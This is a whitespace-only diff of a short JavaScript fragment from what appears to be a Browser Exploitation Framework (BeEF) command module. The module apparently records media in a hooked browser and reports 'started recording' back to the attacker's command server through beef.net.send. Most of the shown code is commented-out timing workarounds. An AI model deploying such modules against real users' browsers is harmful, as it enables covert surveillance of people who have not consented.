@@ -15,15 +15,15 @@ beef.execute(function() {
     // weirdly setTimeout and stopRecord don't seem to work together
     //milliseconds = "<%== @duration %>" * 1000;
     //setTimeout("m.stopRecord()", milliseconds);
-    
+
     // so here is an ugly work around
-    //start = new Date(); 
-    //stop = start.getTime() + 5000; 
-    //do { 
-    //    current = new Date(); 
-    //    current = current.getTime(); 
-    //} while(current < stop) 
+    //start = new Date();
+    //stop = start.getTime() + 5000;
+    //do {
+    //    current = new Date();
+    //    current = current.getTime();
+    //} while(current < stop)
     //m.stopRecord();
-    
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "started recording");	
+
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "started recording");
 });
